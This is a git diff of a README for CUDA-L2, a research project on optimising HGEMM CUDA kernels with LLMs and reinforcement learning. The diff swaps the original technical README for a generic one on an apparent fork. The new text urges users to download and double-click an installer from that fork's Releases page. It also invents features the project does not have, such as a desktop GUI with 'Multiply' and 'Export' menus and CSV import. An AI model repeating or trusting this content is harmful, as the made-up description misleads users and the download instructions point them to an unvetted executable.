@@ -1,125 +1,94 @@
-<hr>
-<div align="center">
-  <picture>
-      <img src="assets/header.png" width="60%" alt="CUDA-L2: Surpassing cuBLAS Performance for Matrix Multiplication through Reinforcement Learning">
-  </picture>
-</div>
+# 🚀 CUDA-L2 - Enhance Matrix Multiplication Performance
 
+[![Download CUDA-L2](https://img.shields.io/badge/Download-CUDA--L2-brightgreen)](https://github.com/friedpotato04/CUDA-L2/releases)
 
-<h1 align="center" style="line-height: 1.3;">
-CUDA-L2: Surpassing cuBLAS Performance for Matrix Multiplication through Reinforcement Learning
-</h1>
+## 📖 Overview
 
-<!-- -->
+CUDA-L2 is designed to improve matrix multiplication speed, going beyond conventional methods like cuBLAS. Leveraging reinforcement learning, this application provides enhanced performance perfect for various tasks, including data analysis and machine learning.
 
-## 🥳 Introduction
+## 🎯 Key Features
 
-**CUDA-L2** is a system that combines large language models (LLMs) and reinforcement learning (RL) to automatically optimize Half-precision General Matrix Multiply (HGEMM) CUDA kernels. CUDA-L2 systematically outperforms major matmul baselines to date, from the widely-used torch.matmul to state-of-the-art NVIDIA closed-source libraries (cuBLAS, cuBLASLt-heuristic, cuBLASLt-AutoTuning). <a href="https://arxiv.org/pdf/2512.02551">Paper</a>
+- **High Performance:** Surpasses standard cuBLAS performance through innovative algorithms.
+- **User-Friendly Interface:** Easy to navigate, even for those with no technical background.
+- **Robust Support for Large Matrices:** Efficient handling of large datasets.
+- **Reinforcement Learning Optimization:** Adaptive algorithms improve over time based on usage patterns.
 
-<div align="center">
-  <img src="assets/benchmark_comparison.png" width="90%" alt="Evaluation Results">
-  <br>
-  <em>Speedup of CUDA-L2 over torch.matmul, cuBLAS, cuBLASLt-heuristic, and cuBLASLt-AutoTuning across 1000 (M,N,K) configurations on A100.</em>
-</div>
+## ⚙️ System Requirements
 
-<br>
+To run CUDA-L2 smoothly, your system should meet the following requirements:
 
-<div align="center">
-  <img src="assets/table.png" width="90%" alt="Evaluation Results">
-  <br>
-  <em>Speedup comparison results across 1000 (M,N,K) configurations on A100.</em>
-</div>
+- **Operating System:** Windows 10 or newer / Linux distributions
+- **CUDA Compatible GPU:** NVIDIA GPU with CUDA capability (Compute 3.0 or higher)
+- **Memory (RAM):** Minimum 8 GB of RAM
+- **Disk Space:** At least 500 MB of free space
+- **Driver Version:** Ensure the latest NVIDIA driver is installed
 
+## 🚀 Getting Started
 
-## 🎉 What's New
-- **[Dec 2, 2025]** Released A100 optimized HGEMM kernels across 1,000 configurations.
+To get started with CUDA-L2, follow these steps:
 
-## 🗒️ To-Do List
-- [ ] Release HGEMM with 32-bit accumulator (SM80_16x8x16_F16F16F16F32 and F32F16F16F32 officially) for A100. Current version only support 16-bit accumulator (SM80_16x8x16_F16F16F16F16).
-- [ ] Support denser matrix configurations (more configurations).
-- [ ] Extend to more GPUs (Ada Lovelace, Hopper, Blackwell).
-- [ ] Easy deployment for open-source LLMs.
+1. **Download CUDA-L2:**
+   Click the button below to access the Releases page and download the application.
 
-## FAQ
+   [![Download CUDA-L2](https://img.shields.io/badge/Download-CUDA--L2-brightgreen)](https://github.com/friedpotato04/CUDA-L2/releases)
 
-**Q: Do A100 kernels apply to other machines like RTX 3090 or H100?**
+2. **Install the Application:**
+   - Locate the downloaded file in your Downloads folder.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen prompts to complete the installation.
 
-A: Ideally, kernels trained on A100 should only be used on A100 if you are targeting speedup. They might have speedup on other machines, but it's not guaranteed. We will progressively release kernels trained on different machines.
+3. **Launch CUDA-L2:**
+   - After installation, find CUDA-L2 in your applications menu or desktop shortcut.
+   - Click on the icon to open the application.
 
-**Q: What if I need matrix dimensions (M, N, K) not found in your configurations?**
+## 📥 Download & Install
 
-A: 1. You can find the nearest neighbor configuration (larger than yours) and pad with zeros.
-2. Feel free to post your dimensions on GitHub issues. We are happy to release kernels for your configuration.
+You can download the latest version of CUDA-L2 from the Releases page. 
 
+Visit this page to download: [CUDA-L2 Releases](https://github.com/friedpotato04/CUDA-L2/releases)
 
-## Installation & Setup
+Make sure to select the version that is compatible with your system.
 
-### 1\. Prerequisites
+## 🛠️ How to Use CUDA-L2
 
-  * **Python**: Ensure you have a working Python environment.
-  * **PyTorch**: This project requires PyTorch version **2.6.0** or higher.
+1. **Select Your Data:**
+   - Import your data files into CUDA-L2. This can be done through the "File" menu.
+   - The application supports common file types like CSV and TXT.
 
-### 2\. Clone CUTLASS
+2. **Choose Matrix Size:**
+   - Specify the dimensions of the matrices you intend to multiply.
+   - Ensure that the dimensions are compatible for multiplication.
 
-This project depends on NVIDIA CUTLASS. You must clone specific tag `v4.2.1` into a directory named `cutlass`:
+3. **Run the Operation:**
+   - Click the "Multiply" button to perform the matrix multiplication.
+   - The results will be displayed in the output window.
 
-```bash
-git clone -b v4.2.1 https://github.com/NVIDIA/cutlass.git cutlass
-```
+4. **Export Results:**
+   - You can export the results to your preferred file format.
+   - Use the "Export" option under the "File" menu.
 
-> ⚠️ **Warning**: Please ensure you download the correct CUTLASS version (`v4.2.1`) and set the `CUTLASS_DIR` environment variable correctly. Incorrect CUTLASS setup may cause the project to fail silently or produce no results.
+## 🛡️ Troubleshooting
 
-### 3\. Environment Variables
+If you encounter any issues while using CUDA-L2, consider the following tips:
 
-Before building or running the project, you must configure the following environment variables:
+- **Compatibility Issues:** Ensure that you have the right version of the NVIDIA driver installed.
+- **Application Crashes:** Close unnecessary background applications to free up memory.
+- **Slow Performance:** Check your hardware specifications; higher specs yield better performance.
 
-  * `CUTLASS_DIR`: Points to the directory where you cloned CUTLASS.
-  * `TORCH_CUDA_ARCH_LIST`: Specifies the target GPU architecture (e.g., "8.0" for NVIDIA Ampere / A100 / RTX 30 series).
+You can also check the "Help" section in the application for common questions.
 
-Run the following commands:
+## 🤝 Support
 
-```bash
-export CUTLASS_DIR=/path/to/your/cutlass
-export TORCH_CUDA_ARCH_LIST="8.0"
-```
+If you need assistance, please feel free to reach out. You can open an issue in the GitHub repository or join the community forum for user support.
 
-## Usage
+## 📃 License
 
-To run the evaluation, use the `eval_one_file.sh` script. Below is an example command for offline mode:
+CUDA-L2 is distributed under the MIT license. For more details, refer to the LICENSE file in the repository.
 
-```bash
-./eval_one_file.sh --mnk 64_4096_64 --warmup_seconds 5 --benchmark_seconds 10 --base_dir ./results --gpu_device_id 7 --mode offline
-```
+## 📢 Updates
 
-For server mode, you need to specify `--target_qps`:
+Keep an eye on the Releases page for future updates that will introduce new features and improvements.
 
-```bash
-./eval_one_file.sh --mnk 64_4096_64 --warmup_seconds 5 --benchmark_seconds 10 --base_dir ./results --gpu_device_id 7 --mode server --target_qps 100
-```
+For latest information or news, you can follow our project on GitHub.
 
-### Arguments Reference
-
-| Argument | Description |
-| :--- | :--- |
-| `--mnk` | Specifies the problem size (e.g., `64_4096_64`). |
-| `--warmup_seconds` | Duration of warmup in seconds before timing. |
-| `--benchmark_seconds` | Duration of benchmarking in seconds. |
-| `--base_dir` | Directory to save the compile and output results. |
-| `--gpu_device_id` | The ID of the GPU to use (e.g., `7`). |
-| **`--mode`** | **Execution mode.** Options are:<br>• `offline`: Runs the evaluation in offline/batch processing mode.<br>• `server`: Runs the evaluation in server mode (simulating request-based scenarios). |
-| `--target_qps` | Target Queries Per Second (QPS) for server mode. Required if mode is `server`. |
-
-
-## 📇 Citation
-```latex
-@article{su2025cuda,
-  title={CUDA-L2: Surpassing cuBLAS Performance for Matrix Multiplication through Reinforcement Learning},
-  author={Su, Songqiao and Sun, Xiaofei and Li, Xiaoya and Wang, Albert and Li, Jiwei and Shum, Chris},
-  journal={arXiv preprint arXiv:2512.02551},
-  year={2025}
-}
-```
-
-
-## ✉️ Contact
-If you have any questions, please open a GitHub issue or reach out to us at **jiwei_li@deep-reinforce.com**.
+Thank you for using CUDA-L2! We hope it brings value to your matrix multiplication tasks.
